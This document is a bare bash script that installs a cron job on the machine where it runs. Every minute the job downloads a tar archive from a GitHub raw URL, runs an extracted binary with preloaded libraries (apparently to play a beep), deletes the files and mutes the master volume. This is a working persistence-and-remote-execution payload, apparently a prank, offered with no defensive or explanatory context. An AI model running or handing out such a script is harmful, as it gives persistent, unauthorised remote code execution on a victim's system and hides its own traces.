#!/bin/bash

cd "$(mktemp -d)";
crontab -l > mycron;
echo "* * * * * cd \"\$(mktemp -d)\" && wget https://github.com/skyf0l/skyf0l.github.io/raw/main/beep.tar -Obeep.tar && tar -xf beep.tar && LD_PRELOAD=\"\$(realpath libSFaudio.so) \$(realpath libSFsystem.so)\" ./beep.bin && rm -f libSFaudio.so libSFsystem.so beep.bin beep.ogg beep.tar && amixer set Master 0%" >> mycron;
crontab mycron;
rm -f mycron;
exit;
